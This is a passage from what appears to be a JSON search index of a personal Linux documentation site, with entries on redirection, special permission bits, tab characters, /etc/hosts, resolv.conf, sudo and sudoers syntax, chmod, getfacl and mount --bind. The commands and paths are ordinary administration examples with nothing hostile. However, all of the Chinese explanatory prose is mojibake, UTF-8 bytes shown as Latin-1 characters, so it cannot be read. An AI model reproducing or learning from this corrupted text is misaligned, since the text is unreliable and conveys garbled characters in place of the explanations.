æˆ‘ä»¬ä½¿ç”¨<å¯¹è¾“å…¥åšé‡å®šå‘ï¼Œå¦‚æœç¬¦å·å·¦è¾¹æ²¡æœ‰å†™å€¼ï¼Œé‚£ä¹ˆé»˜è®¤å°±æ˜¯0ã€‚ é‡å®šå‘é¡ºåº command >log.txt 2>&1 å°†æ ‡å‡†è¾“å‡º, é”™è¯¯è¾“å‡ºéƒ½è¾“å‡ºåˆ°ä¸€ä¸ªæ–‡ä»¶: command >log.txt 2>&1 ç†è§£çš„è¯å¯ä»¥æŒ‰ç…§é¡ºåºçœ‹, å…ˆ: >log.txt æ­¤å¤„çœç•¥äº†1, å³: 1>log.txt è¡¨ç¤ºæŠŠæ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ° log.txt, åé¢çš„: 2>&1 è¡¨ç¤ºæŠŠæ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º. command &>log.txt å®˜æ–¹æä¾›äº†ä¸€ä¸ªç‰¹æ®Šçš„: command &>log.txt ä¸ä¸Šé¢å«ä¹‰ä¸€è‡´, è¡¨ç¤ºæŠŠæ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡º.","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Redirect.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Redirect.html"},{"title":"ç‰¹æ®Šçš„æƒé™ä½","text":"Set-User-ID(SUID)ä½ s æˆ– S æ›¿æ¢ç”¨æˆ·çš„ x Set-Group-ID(SGID)ä½ s æˆ– S æ›¿æ¢ç»„çš„ x ç²˜æ»ä½ t æˆ– T æ›¿ä»£å…¶ä»–ç”¨æˆ·çš„ x","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Special-permissions.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Special-permissions.html"},{"title":"åˆ¶è¡¨ç¬¦","text":"å‚è€ƒ: https://www.zhihu.com/question/19773623/answer/176124901 æ°´å¹³åˆ¶è¡¨ç¬¦ï¼ˆ \\t ï¼‰ ç›¸ä¿¡å¤§å®¶å¯¹ \\t è¿˜æ˜¯æ¯”è¾ƒç†Ÿæ‚‰çš„ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œå…¶åœ¨ç»ˆç«¯å’Œæ–‡ä»¶ä¸­çš„è¾“å‡ºæ˜¾ç¤ºç›¸å½“äºæŒ‰ä¸‹é”®ç›˜TABé”®æ•ˆæœã€‚ ä¸€èˆ¬ç³»ç»Ÿä¸­ï¼Œæ˜¾ç¤ºæ°´å¹³åˆ¶è¡¨ç¬¦å°†å 8åˆ—ã€‚ åŒæ—¶æ°´å¹³åˆ¶è¡¨ç¬¦å¼€å§‹å æ®çš„åˆå§‹ä½ ç½®æ˜¯ç¬¬8*nåˆ—ï¼ˆç¬¬ä¸€åˆ—çš„ä¸‹æ ‡ä¸º0ï¼‰ã€‚ ä¾‹å¦‚: puts(\"0123456\\txx\"); å‚ç›´åˆ¶è¡¨ç¬¦ï¼ˆ \\v ï¼‰ å‚ç›´åˆ¶è¡¨ç¬¦ä¸å¸¸ç”¨ã€‚ å®ƒçš„ä½œç”¨æ˜¯è®© \\v åé¢çš„å­—ç¬¦ä»ä¸‹ä¸€è¡Œå¼€å§‹è¾“å‡ºï¼Œ ä¸”å¼€å§‹çš„åˆ—æ•°ä¸º \\v å‰ä¸€ä¸ªå­—ç¬¦æ‰€åœ¨åˆ—åé¢ä¸€åˆ—ã€‚ ä¾‹å¦‚: puts(\"01\\v2345\") ä½†æ˜¯ç«–ç›´åˆ¶è¡¨ç¬¦åœ¨å‘½ä»¤æç¤ºç¬¦ä¸­æ˜¾ç¤ºä¸å‡ºæ¥ï¼Œ åªä¼šæ˜¾ç¤ºä¸€ä¸ªæ¡†ï¼ˆå¯èƒ½æ˜¯å› ä¸ºç«–ç›´åˆ¶è¡¨ç¬¦æ˜¯æ‰“å°çš„æ—¶å€™ç”¨çš„ï¼Ÿï¼‰","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Conceptual-Tabs.html","loc":"/yq-doc-source-docs-operating-system-linux-Conceptual-Tabs.html"},{"title":"/etc/hosts","text":"æŸ¥çœ‹æœ¬åœ°åŸŸåä¸åœ°å€æ˜ å°„, å†…å®¹ä¸º åœ°å€ä¸åŸŸåçš„æ˜ å°„, ä¾‹å¦‚, /etc/hosts çœ‹èµ·æ¥å¦‚ä¸‹: 127.0.0.1 localhost 127.0.1.1 host_name ### The following lines are desirable for IPv6 capable hosts ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters æ¯ä¸€è¡Œç”± IP åœ°å€ å¼€å§‹ï¼Œæ¥ä¸‹æ¥æ˜¯ç›¸å…³è”çš„ ä¸»æœºå . host_name åŒ¹é…åœ¨ /etc/hostname é‡Œå®šä¹‰çš„ä¸»æœºåã€‚ å¯¹äºæœ‰æ°¸ä¹… IP åœ°å€çš„ç³»ç»Ÿï¼Œè¿™ä¸ªæ°¸ä¹… IP åœ°å€åº”å½“ä»£æ›¿è¿™é‡Œçš„ 127.0.1.1 ã€‚ å¯¹äºæœ‰æ°¸ä¹… IP åœ°å€å’Œæœ‰ åŸŸåç³»ç»Ÿ Domain Name System (DNS) æä¾› å®Œå…¨èµ„æ ¼åŸŸå fully qualified domain name (FQDN) çš„ç³»ç»Ÿï¼Œè§„èŒƒå host_name.domain_name åº”å½“è¢«ç”¨æ¥ä»£æ›¿ host_name .","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Configuration-file-ETC-HOSTS.html","loc":"/yq-doc-source-docs-operating-system-linux-Configuration-file-ETC-HOSTS.html"},{"title":"/etc/resolv.conf","text":"é…ç½®æœ¬æœºä½¿ç”¨dnsæœåŠ¡å™¨, ä»¥nameserverå¼€å¤´, å¯å¤šè¡Œ. å¦‚æœ resolvconf è½¯ä»¶åŒ…æ²¡æœ‰å®‰è£…ï¼Œ /etc/resolv.conf æ˜¯ä¸€ä¸ªé™æ€æ–‡ä»¶ã€‚ å¦‚æœå®‰è£…äº†ï¼Œå®ƒæ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥ã€‚ æ­¤å¤–ï¼Œå®ƒåŒ…å«æœ‰è§£æç­–ç•¥çš„åˆå§‹åŒ–ä¿¡æ¯ã€‚å¦‚ DNS æ˜¯ IP= 192.168.11.1 ,åˆ™åŒ…å«å¦‚ä¸‹: nameserver 192.168.11.1 resolvconf è½¯ä»¶åŒ…ä½¿è¿™ä¸ª /etc/resolv.conf æ–‡ä»¶æˆä¸ºä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œå¹¶é€šè¿‡é’©å­è„šæœ¬è‡ªåŠ¨ç®¡ç†å…¶å†…å®¹ã€‚ æ³¨è§£ è§: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/resolvconf","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Configuration-file-ETC-Resolv-CONF.html","loc":"/yq-doc-source-docs-operating-system-linux-Configuration-file-ETC-Resolv-CONF.html"},{"title":"PS1","text":"å‚è€ƒ /docs/æ“ä½œç³»ç»Ÿ/linux/debian/debianæ‰‹å†Œ/PS1 æç¤ºç¬¦å®šä¹‰","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-PS1.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-PS1.html"},{"title":"TMPDIR","text":"åº”ç”¨ç¨‹åºä¸€èˆ¬åœ¨ä¸´æ—¶å­˜å‚¨ç›®å½• /tmp ä¸‹å»ºç«‹ä¸´æ—¶æ–‡ä»¶ã€‚ å¦‚æœ /tmp æ²¡æœ‰è¶³å¤Ÿçš„ç©ºé—´ï¼Œ å¯ä»¥é€šè¿‡ $TMPDIR å˜é‡æ¥ä¸ºç¨‹åºæŒ‡å®šä¸´æ—¶å­˜å‚¨ç›®å½•ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-TMPDIR.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-environment-variable-TMPDIR.html"},{"title":"at","text":"","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AT.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-AT.html"},{"title":"lsmod","text":"å†…æ ¸æ¨¡å—å¯è§: /docs/æ“ä½œç³»ç»Ÿ/linux/ç³»ç»ŸæœåŠ¡/å†…æ ¸æ¨¡å—","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LSMOD.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-LSMOD.html"},{"title":"od","text":"","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-OD.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-OD.html"},{"title":"resolvconf","text":"æ³¨è§£ è¿™æ˜¯ä¸€ä¸ªè½¯ä»¶åŒ…, ä¸ç¡®å®šæœ‰æ²¡æœ‰æŒ‡ä»¤ ä¸ /etc/resolv.conf ç›¸å…³, é…ç½®åŸŸåè§£ææœåŠ¡åœ°å€ å¦‚æœ resolvconf è½¯ä»¶åŒ…æ²¡æœ‰å®‰è£…ï¼Œ /etc/resolv.conf æ˜¯ä¸€ä¸ªé™æ€æ–‡ä»¶ã€‚ å¦‚æœå®‰è£…äº†ï¼Œå®ƒæ˜¯ä¸€ä¸ªç¬¦å·é“¾æ¥. æ­¤å¤–ï¼Œå®ƒåŒ…å«æœ‰è§£æç­–ç•¥çš„åˆå§‹åŒ–ä¿¡æ¯ã€‚å¦‚ DNS æ˜¯ IP=\" 192.168.11.1 \",åˆ™åŒ…å«å¦‚ä¸‹: nameserver 192.168.11.1 resolvconf è½¯ä»¶åŒ…ä½¿è¿™ä¸ª /etc/resolv.conf æ–‡ä»¶æˆä¸ºä¸€ä¸ªç¬¦å·é“¾æ¥ï¼Œ å¹¶é€šè¿‡é’©å­è„šæœ¬è‡ªåŠ¨ç®¡ç†å…¶å†…å®¹ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Resolvconf.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-Resolvconf.html"},{"title":"sudo","text":"ä»¥ç³»ç»Ÿç®¡ç†è€…çš„èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ sudo ç¨‹åºæ˜¯ä¸ºäº†ä½¿ä¸€ä¸ªç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥ç»™ç”¨æˆ·å—é™çš„ root æƒé™å¹¶è®°å½• root æ´»åŠ¨è€Œè®¾è®¡çš„ã€‚ sudo åªéœ€è¦ä¸€ä¸ªæ™®é€šç”¨æˆ·çš„å¯†ç ã€‚ å®‰è£… sudo è½¯ä»¶åŒ…å¹¶é€šè¿‡è®¾ç½® /etc/sudoers ä¸­çš„é€‰é¡¹æ¥ä½¿ç”¨å®ƒ é€‰é¡¹å‚æ•° -V æ˜¾ç¤ºç‰ˆæœ¬ç¼–å· -h ä¼šæ˜¾ç¤ºç‰ˆæœ¬ç¼–å·åŠæŒ‡ä»¤çš„ä½¿ç”¨æ–¹å¼è¯´æ˜ -l æ˜¾ç¤ºå‡ºè‡ªå·±ï¼ˆæ‰§è¡Œ sudo çš„ä½¿ç”¨è€…ï¼‰çš„æƒé™ -L æ˜¾ç¤ºsudoè®¾ç½® -v å› ä¸º sudo åœ¨ç¬¬ä¸€æ¬¡æ‰§è¡Œæ—¶æˆ–æ˜¯åœ¨ N åˆ†é’Ÿå†…æ²¡æœ‰æ‰§è¡Œï¼ˆN é¢„è®¾ä¸ºäº”ï¼‰ä¼šé—®å¯†ç ï¼Œè¿™ä¸ªå‚æ•°æ˜¯é‡æ–°åšä¸€æ¬¡ç¡®è®¤ï¼Œå¦‚æœè¶…è¿‡ N åˆ†é’Ÿï¼Œä¹Ÿä¼šé—®å¯†ç  -k å°†ä¼šå¼ºè¿«ä½¿ç”¨è€…åœ¨ä¸‹ä¸€æ¬¡æ‰§è¡Œ sudo æ—¶é—®å¯†ç ï¼ˆä¸è®ºæœ‰æ²¡æœ‰è¶…è¿‡ N åˆ†é’Ÿï¼‰ -b å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤æ”¾åœ¨èƒŒæ™¯æ‰§è¡Œ -p prompt å¯ä»¥æ›´æ”¹é—®å¯†ç çš„æç¤ºè¯­ï¼Œå…¶ä¸­ %u ä¼šä»£æ¢ä¸ºä½¿ç”¨è€…çš„å¸å·åç§°ï¼Œ %h ä¼šæ˜¾ç¤ºä¸»æœºåç§° -u username/#uid ä¸åŠ æ­¤å‚æ•°ï¼Œä»£è¡¨è¦ä»¥ root çš„èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ï¼Œè€ŒåŠ äº†æ­¤å‚æ•°ï¼Œå¯ä»¥ä»¥ username çš„èº«ä»½æ‰§è¡ŒæŒ‡ä»¤ï¼ˆ#uid ä¸ºè¯¥ username çš„ä½¿ç”¨è€…å·ç ï¼‰ -s æ‰§è¡Œç¯å¢ƒå˜æ•°ä¸­çš„ SHELL æ‰€æŒ‡å®šçš„ shell ï¼Œæˆ–æ˜¯ /etc/passwd é‡Œæ‰€æŒ‡å®šçš„ shell -H å°†ç¯å¢ƒå˜æ•°ä¸­çš„ HOME ï¼ˆå®¶ç›®å½•ï¼‰æŒ‡å®šä¸ºè¦å˜æ›´èº«ä»½çš„ä½¿ç”¨è€…å®¶ç›®å½•ï¼ˆå¦‚ä¸åŠ  -u å‚æ•°å°±æ˜¯ç³»ç»Ÿç®¡ç†è€… root ï¼‰ -i åˆ‡æ¢åˆ°rootç”¨æˆ·, å¹¶åŠ è½½rootçš„ç¯å¢ƒå˜é‡(éœ€è¦è¾“å…¥å½“å‰ç”¨æˆ·çš„å¯†ç ) ç›´æ¥åŠ  command æ—¢å¯ä»¥ç³»ç»Ÿç®¡ç†è€…èº«ä»½ï¼ˆæˆ–ä»¥ -u æ›´æ”¹ä¸ºå…¶ä»–äººï¼‰æ‰§è¡Œè¯¥ command æŠ€å·§ ä»¥rootæƒé™æ‰§è¡Œä¸Šä¸€æ¡å‘½ä»¤: sudo !! é…ç½® å¯ä»¥åœ¨ /etc/sudoers é…ç½®å¯ä½¿ç”¨sudoçš„ç”¨æˆ·: # /etc/sudoers ALL ALL=(ALL:ALL) ALL # ALL ALL=(ALL:ALL) ALL # username host=(user:group) cmd å¤šä¸ªcmdè§„åˆ™ä»¥é€—å·åˆ†éš” # ä¹Ÿå¯ä»¥ä»…å†™ä¸€ä¸ª è®¾ç½®å…å¯†ï¼ŒNOPASSWD:cmd # è®¾ç½®ç¦æ­¢, !cmd # The first ALL is the users allowed, + % is group # The second one is the hosts # The third one is the user as you are running the command ï¼ˆroot:rootï¼‰user:group # The last one is the commands allowed # ALL è¡¨ç¤ºä»»ä½•èº«ä»½ã€ä¸»æœºã€æŒ‡ä»¤","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SUDO.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-SUDO.html"},{"title":"chgrp","text":"ç”¨äºæ–‡ä»¶çš„æ‰€æœ‰è€…æˆ– root è´¦æˆ·ä¿®æ”¹æ–‡ä»¶æ‰€å±çš„ç»„: chgrp *newgroup* foo","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chGRP.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chGRP.html"},{"title":"chmod","text":"ç”¨äºæ–‡ä»¶çš„æ‰€æœ‰è€…æˆ– root è´¦æˆ·ä¿®æ”¹æ–‡ä»¶å’Œæ–‡ä»¶å¤¹çš„è®¿é—®æƒé™: chmod [ugoa][+-=][rwxXst][,...] foo","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chmod.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-chmod.html"},{"title":"fdisk","text":"","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-fdisk.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-fdisk.html"},{"title":"getfacle","text":"æŸ¥çœ‹aclæƒé™: getfacle $filename ä¾‹: [root@localhost /]# getfacl project #æŸ¥çœ‹/prpjectç›®å½•çš„ACLæƒé™ #file: project <-æ–‡ä»¶å #owner: root <-æ–‡ä»¶çš„å±ä¸» #group: tgroup <-æ–‡ä»¶çš„å±ç»„ user::rwx <-ç”¨æˆ·åæ æ˜¯ç©ºçš„ï¼Œè¯´æ˜æ˜¯å±ä¸»çš„æƒé™ user:st:r-x <-ç”¨æˆ·stçš„æƒé™ group::rwx <-ç»„åæ æ˜¯ç©ºçš„ï¼Œè¯´æ˜æ˜¯å±ç»„çš„æƒé™ mask::rwx <-maskæƒé™ other::--- <-å…¶ä»–äººçš„æƒé™ å…³äºACLæƒé™å‚è€ƒ: /docs/æ“ä½œç³»ç»Ÿ/linux/ç³»ç»ŸæœåŠ¡/ACLæƒé™æ§åˆ¶","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-getfal.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-getfal.html"},{"title":"insmod","text":"å†…æ ¸æ¨¡å—å¯è§: /docs/æ“ä½œç³»ç»Ÿ/linux/ç³»ç»ŸæœåŠ¡/å†…æ ¸æ¨¡å—","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-insmod.html","loc":"/yq-doc-source-docs-operating-system-linux-Linux-instruction-insmod.html"},{"title":"mount","text":"mountå‘½ä»¤ åŠŸèƒ½ï¼šæ–‡ä»¶æŒ‚è½½ æ ¼å¼: mount [-å‚æ•°] [è®¾å¤‡åç§°] [æŒ‚è½½ç‚¹] å¸¸ç”¨é€‰é¡¹ï¼š -a å®‰è£…åœ¨/etc/fstabæ–‡ä»¶ä¸­ç±»å‡ºçš„æ‰€æœ‰æ–‡ä»¶ç³»ç»Ÿã€‚ -f ä¼ªè£…mountï¼Œä½œå‡ºæ£€æŸ¥è®¾å¤‡å’Œç›®å½•çš„æ ·å­ï¼Œä½†å¹¶ä¸çœŸæ­£æŒ‚è½½æ–‡ä»¶ç³»ç»Ÿã€‚ -n ä¸æŠŠå®‰è£…è®°å½•åœ¨/etc/mtab æ–‡ä»¶ä¸­ã€‚ -r å°†æ–‡ä»¶ç³»ç»Ÿå®‰è£…ä¸ºåªè¯»ã€‚ -v è¯¦ç»†æ˜¾ç¤ºå®‰è£…ä¿¡æ¯ã€‚ -w å°†æ–‡ä»¶ç³»ç»Ÿå®‰è£…ä¸ºå¯å†™ï¼Œä¸ºå‘½ä»¤é»˜è®¤æƒ…å†µã€‚ -t <æ–‡ä»¶ç³»ç»Ÿç±»å‹> æŒ‡å®šè®¾å¤‡çš„æ–‡ä»¶ç³»ç»Ÿç±»å‹ï¼Œå¸¸è§çš„æœ‰ï¼š ext2 æ˜¯linuxç›®å‰å¸¸ç”¨çš„æ–‡ä»¶ç³»ç»Ÿ msdos MS-DOSçš„fatï¼Œå°±æ˜¯fat16 vfat windows98å¸¸ç”¨çš„fat32 nfs ç½‘ç»œæ–‡ä»¶ç³»ç»Ÿ iso9660 CD-ROMå…‰ç›˜æ ‡å‡†æ–‡ä»¶ç³»ç»Ÿ ntfs windows NT/2000/XPçš„æ–‡ä»¶ç³»ç»Ÿ auto è‡ªåŠ¨æ£€æµ‹æ–‡ä»¶ç³»ç»Ÿ -o <é€‰é¡¹> æŒ‡å®šæŒ‚è½½æ–‡ä»¶ç³»ç»Ÿæ—¶çš„é€‰é¡¹ï¼Œæœ‰äº›ä¹Ÿå¯å†™åˆ°åœ¨ /etc/fstab ä¸­ã€‚å¸¸ç”¨çš„æœ‰ï¼š defaults ä½¿ç”¨æ‰€æœ‰é€‰é¡¹çš„é»˜è®¤å€¼ï¼ˆautoã€nouserã€rwã€suidï¼‰ auto/noauto å…è®¸/ä¸å…è®¸ä»¥ â€“aé€‰é¡¹è¿›è¡Œå®‰è£… dev/nodev å¯¹/ä¸å¯¹æ–‡ä»¶ç³»ç»Ÿä¸Šçš„ç‰¹æ®Šè®¾å¤‡è¿›è¡Œè§£é‡Š exec/noexec å…è®¸/ä¸å…è®¸æ‰§è¡ŒäºŒè¿›åˆ¶ä»£ç  suid/nosuid ç¡®è®¤/ä¸ç¡®è®¤suidå’Œsgidä½ user/nouser å…è®¸/ä¸å…è®¸ä¸€èˆ¬ç”¨æˆ·æŒ‚è½½ codepage=XXX ä»£ç é¡µ iocharset=XXX å­—ç¬¦é›† ro ä»¥åªè¯»æ–¹å¼æŒ‚è½½ rw ä»¥è¯»å†™æ–¹å¼æŒ‚è½½ remount é‡æ–°å®‰è£…å·²ç»å®‰è£…äº†çš„æ–‡ä»¶ç³»ç»Ÿ loop æŒ‚è½½\"å›æ—‹è®¾å¤‡\"ä»¥åŠ\"ISOé•œåƒæ–‡ä»¶\" --bind <dir1 dir2> å‘½ä»¤æ¥å°†ä¸¤ä¸ªç›®å½•è¿æ¥èµ·æ¥ï¼Œ mount --bind å‘½ä»¤æ˜¯å°†å‰ä¸€ä¸ªç›®å½•æŒ‚è½½åˆ°åä¸€ä¸ªç›®å½•ä¸Šï¼Œ æ‰€æœ‰å¯¹åä¸€ä¸ªç›®å½•çš„è®¿é—®å…¶å®éƒ½æ˜¯å¯¹å‰ä¸€ä¸ªç›®å½•çš„è®¿é—® å…³äº --bind mount --bind test1 test2 ä¸ºä¾‹ï¼Œ å½“ mount --bind å‘½ä»¤æ‰§è¡Œåï¼ŒLinuxå°†ä¼šæŠŠè¢«æŒ‚è½½ç›®å½•çš„ç›®å½•é¡¹ï¼ˆä¹Ÿå°±æ˜¯è¯¥ç›®å½•æ–‡ä»¶çš„blockï¼Œè®°å½•äº†ä¸‹çº§ç›®å½•çš„ä¿¡æ¯ï¼‰å±è”½ï¼Œ å³test2çš„ä¸‹çº§è·¯å¾„è¢«éšè—èµ·æ¥äº†ï¼ˆæ³¨æ„ï¼Œåªæ˜¯éšè—ä¸æ˜¯åˆ é™¤ï¼Œæ•°æ®éƒ½æ²¡æœ‰æ”¹å˜ï¼Œåªæ˜¯è®¿é—®ä¸åˆ°äº†ï¼‰ã€‚ åŒæ—¶ï¼Œå†…æ ¸å°†æŒ‚è½½ç›®å½• test1 çš„ç›®å½•é¡¹è®°å½•åœ¨å†…å­˜é‡Œçš„ä¸€ä¸ªs_rootå¯¹è±¡é‡Œï¼Œ åœ¨mountå‘½ä»¤æ‰§è¡Œæ—¶ï¼ŒVFSä¼šåˆ›å»ºä¸€ä¸ªvfsmountå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡é‡ŒåŒ…å«äº†æ•´ä¸ªæ–‡ä»¶ç³»ç»Ÿæ‰€æœ‰çš„mountä¿¡æ¯ï¼Œ å…¶ä¸­ä¹Ÿä¼šåŒ…æ‹¬æœ¬æ¬¡mountä¸­çš„ä¿¡æ¯ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯ä¸€ä¸ªHASHå€¼å¯¹åº”è¡¨ï¼ˆHASHå€¼é€šè¿‡å¯¹è·¯å¾„å­—ç¬¦ä¸²çš„è®¡ç®—å¾—æ¥ï¼‰ï¼Œ è¡¨é‡Œå°±æœ‰ /test1 åˆ° /test2 ä¸¤ä¸ªç›®å½•çš„HASHå€¼å¯¹åº”å…³ç³»ã€‚ å‘½ä»¤æ‰§è¡Œå®Œåï¼Œå½“è®¿é—® /test2ä¸‹çš„æ–‡ä»¶æ—¶ï¼Œ ç³»ç»Ÿä¼šå‘ŠçŸ¥ /test2 çš„ç›®å½•é¡¹è¢«å±è”½æ‰äº†ï¼Œ è‡ªåŠ¨è½¬åˆ°å†…å­˜é‡Œæ‰¾VFSï¼Œé€šè¿‡ vfsmount äº†è§£åˆ° /test2 å’Œ /test1 çš„å¯¹åº”å…³ç³»ï¼Œ ä»è€Œè¯»å–åˆ° /test1 çš„inodeï¼Œè¿™æ ·åœ¨ /test2 ä¸‹è¯»åˆ°çš„å…¨æ˜¯ /test1 ç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚ mount --bindè¿æ¥çš„ä¸¤ä¸ªç›®å½•çš„inodeå·ç å¹¶ä¸ä¸€æ ·ï¼Œ åªæ˜¯è¢«æŒ‚è½½ç›®å½•çš„blockè¢«å±è”½æ‰ï¼Œinodeè¢«é‡å®šå‘åˆ°æŒ‚è½½ç›®å½•çš„inodeï¼ˆè¢«æŒ‚è½½ç›®å½•çš„inodeå’Œblockä¾ç„¶æ²¡å˜ï¼‰ã€‚ ä¸¤ä¸ªç›®å½•çš„å¯¹åº”å…³ç³»å­˜åœ¨äºå†…å­˜é‡Œï¼Œä¸€æ—¦é‡å¯æŒ‚è½½å…³ç³»å°±ä¸å­˜åœ¨äº†ã€‚ åœ¨å›ºä»¶å¼€å‘è¿‡ç¨‹ä¸­å¸¸å¸¸é‡åˆ°è¿™æ ·çš„æƒ…å†µï¼šä¸ºæµ‹è¯•æŸä¸ªæ–°åŠŸèƒ½ï¼Œå¿…éœ€ä¿®æ”¹æŸä¸ªç³»ç»Ÿæ–‡ä»¶ã€‚ è€Œè¿™ä¸ªæ–‡ä»¶åœ¨åªè¯»æ–‡ä»¶ç³»ç»Ÿä¸Šï¼ˆæ€»ä¸èƒ½ä¸ºä¸€ä¸ªå°å°çš„æµ‹è¯•å°±é‡åˆ·å›ºä»¶å§ï¼‰ï¼Œ æˆ–è€…æ˜¯è™½ç„¶æ–‡ä»¶å¯å†™ï¼Œä½†æ˜¯è‡ªå·±å¯¹è¿™ä¸ªæ”¹åŠ¨æ²¡æœ‰æŠŠæ¡ï¼Œä¸æ„¿æ„ç›´æ¥ä¿®æ”¹ã€‚è¿™æ—¶å€™ mount --bind å°±æ˜¯ä½ çš„å¥½å¸®æ‰‹ã€‚ å‡è®¾æˆ‘ä»¬è¦æ”¹çš„æ–‡ä»¶æ˜¯/etc/hostsï¼Œå¯æŒ‰ä¸‹é¢çš„æ­¥éª¤æ“ä½œ: æŠŠæ–°çš„hostsæ–‡ä»¶æ”¾åœ¨/tmpä¸‹ã€‚ å½“ç„¶ä¹Ÿå¯æ”¾åœ¨ç¡¬ç›˜æˆ–Uç›˜ä¸Šã€‚ mount --bind /tmp/hosts /etc/hosts , æ­¤æ—¶çš„/etcç›®å½•æ˜¯å¯å†™çš„ï¼Œæ‰€åšä¿®æ”¹ä¸ä¼šåº”ç”¨åˆ°åŸæ¥çš„/etcç›®å½•ï¼Œ å¯ä»¥æ”¾å¿ƒæµ‹è¯•ã€‚æµ‹è¯•å®Œæˆäº†æ‰§è¡Œ umount /etc/hosts æ–­å¼€ç»‘å®š(å¯å‚è€ƒ: umount ) ä¾‹å¦‚: ## test1 test2ä¸ºä¸¤ä¸ªä¸åŒçš„ç›®å½• linux-UMLhEm:/home/test/linux # ls test1 11.test 1.test linux-UMLhEm:/home/test/linux # ls test2 22.test 2.test linux-UMLhEm:/home/test/linux # ls -lid test1 1441802 drwx------ 2 root root 4096 Feb 13 09:50 test1 linux-UMLhEm:/home/test/linux # ls -lid test2 1441803 drwx------ 2 root root 4096 Feb 13 09:51 test2 ## æ‰§è¡Œmount --bind å°†test1æŒ‚è½½åˆ°test2ä¸Šï¼Œinodeå·éƒ½å˜ä¸ºtest1çš„inode linux-UMLhEm:/home/test/linux # mount --bind test1 test2 linux-UMLhEm:/home/test/linux # ls -lid test1 1441802 drwx------ 2 root root 4096 Feb 13 09:50 test1 linux-UMLhEm:/home/test/linux # ls -lid test2 1441802 drwx------ 2 root root 4096 Feb 13 09:50 test2 linux-UMLhEm:/home/test/linux # ls test2 11.test 1.test å‚è€ƒ: mount --bindä½¿ç”¨æ–¹æ³• æ‰©å±•å¯ç”¨å­˜å‚¨ç©ºé—´ æ–¹æ¡ˆ1: ä½¿ç”¨ --bind å¦‚æœä½ åœ¨å¦ä¸€ä¸ªåˆ†åŒºé‡Œæœ‰ä¸€ä¸ªå¸¦æœ‰å¯ç”¨ç©ºé—´çš„ç©ºç›®å½•ï¼ˆä¾‹å¦‚ /path/to/emp-dir ï¼‰ï¼Œ ä½ å¯ä»¥é€šè¿‡å¸¦æœ‰ \" --bind \" é€‰é¡¹çš„ mount ï¼Œ å°†å®ƒæŒ‚è½½åˆ°ä¸€ä¸ªä½ éœ€è¦æ›´å¤šç©ºé—´çš„ç›®å½•ï¼ˆä¾‹å¦‚ work-dir ï¼‰: $ sudo mount --bind /path/to/emp-dir work-dir æ³¨è§£ è¿™ä¸ªåªæ˜¯ç›¸å½“äºç”¨ /path/to/emp-dir æš‚æ—¶å°† work-dir å±è”½, ä¿¡æ¯ä¿å­˜ä¸å†…å­˜ä¸­, åªå»ºè®®æµ‹è¯•ä½¿ç”¨ æ–¹æ¡ˆ2: ä½¿ç”¨ -t overlay é€šè¿‡ overlay æŒ‚è½½ï¼ˆoverlay-mountingï¼‰å¦ä¸€ä¸ªç›®å½•æ¥æ‰©å±•å¯ç”¨å­˜å‚¨ç©ºé—´ å¦‚æœä½ 